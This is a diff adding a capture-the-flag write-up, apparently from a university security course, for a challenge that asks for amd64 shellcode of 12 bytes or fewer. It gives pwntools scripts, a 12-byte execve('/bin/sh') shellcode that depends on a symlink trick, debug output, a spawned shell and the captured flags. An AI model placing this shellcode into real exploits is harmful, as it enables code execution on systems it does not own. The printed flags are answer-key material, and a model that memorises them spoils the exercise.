@@ -311,6 +311,126 @@ $ cat flag
 CS6332{n0_puSh_bUt_CLTD}
 ```
 
+## 5-short-shellcode-64
+
+The problem statement is below.
+
+```md
+Can you write a non-zero shellcode without using more than 12 bytes, in amd64?
+The program runs setregid(getegid(), getegid()) for you.
+```
+
+When I run this Python program, it says that the shellcode is too long.
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+from pwn import asm, context, process
+
+context.terminal = ["tmux", "splitw", "-h"]
+context.log_level = "DEBUG"
+
+io = process(["./5-short-shellcode-64"])
+shellcode = asm(
+    """
+mov     eax, 0x0b
+push    edx
+push    0x68732f6e
+push    0x69622f2f
+mov     ebx, esp
+mov     ecx, 0
+mov     edx, 0
+int     0x80
+"""
+)
+with open("shellcode.bin", "wb") as shellcode_file:
+    shellcode_file.write(shellcode)
+io.interactive()
+```
+
+We have to shorten x86 code to execute the below.
+
+```bash
+  execve("/bin/sh", 0, 0);
+```
+
+It uses a lot of bytes to use "/bin/sh" naively.
+
+The first thing I can improve is `mov eax, 0x0b`. Why does it use `eax` instead of `al` to decrease the bytes.
+
+Second, pushing an entire string is costly. Create a link to `/bin/sh` like `ln -s /bin/sh A` and change the program to `execve("A", 0, 0);"`. Moreover, `mov` instruction is costly. Use `push` the top of the stack and `pop` it to`rsp`.
+
+Also, `mov {register} {constant}` is byte-consuming. Apply `xor` to `rsi`. For `rdx`, you can use `cltd`. This instruction fills `cltd` with the most bit of `rax`.
+
+The remaining thing is to execute `syscall`. This is it.
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+from pwn import asm, context, process
+
+context.arch = "amd64"
+context.terminal = ["tmux", "splitw", "-h"]
+context.log_level = "DEBUG"
+
+
+shellcode = asm(
+    """
+cltd
+mov     al, 0x3b
+push    0x41
+push    rsp
+pop     rdi
+xor     rsi, rsi
+syscall
+"""
+)
+
+print(shellcode, len(shellcode))
+with open("shellcode.bin", "wb") as shellcode_file:
+    shellcode_file.write(shellcode)
+io = process(["./5-short-shellcode-64"])
+io.interactive()
+
+```
+
+Then, you get the flag.
+
+```bash
+TXK220008@ctf-vm1:~/unit2/5-short-shellcode-64$ ./solve5.py 
+[DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python3.8/dist-packages/pwnlib/data/includes /dev/stdin
+[DEBUG] Assembling
+    .section .shellcode,"awx"
+    .global _start
+    .global __start
+    .p2align 2
+    _start:
+    __start:
+    .intel_syntax noprefix
+    cltd
+    mov al, 0x3b
+    push 0x41
+    push rsp
+    pop rdi
+    xor rsi, rsi
+    syscall
+[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-f74zykiu/step2 /tmp/pwn-asm-f74zykiu/step1
+[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-f74zykiu/step3 /tmp/pwn-asm-f74zykiu/step4
+b'\x99\xb0;jAT_H1\xf6\x0f\x05' 12
+[+] Starting local process './5-short-shellcode-64': pid 29486
+[*] Switching to interactive mode
+[DEBUG] Received 0x25 bytes:
+    b'Reading shellcode from shellcode.bin\n'
+Reading shellcode from shellcode.bin
+$ cat flag
+[DEBUG] Sent 0x9 bytes:
+    b'cat flag\n'
+[DEBUG] Received 0x2b bytes:
+    b'CS6332{y0u_mAy_ne3d_n0t_m0rE_tHaN_3_bytEs}\n'
+CS6332{y0u_mAy_ne3d_n0t_m0rE_tHaN_3_bytEs}
+```
+
+
 ## 7-dep-0
 
 The problem statement is below.
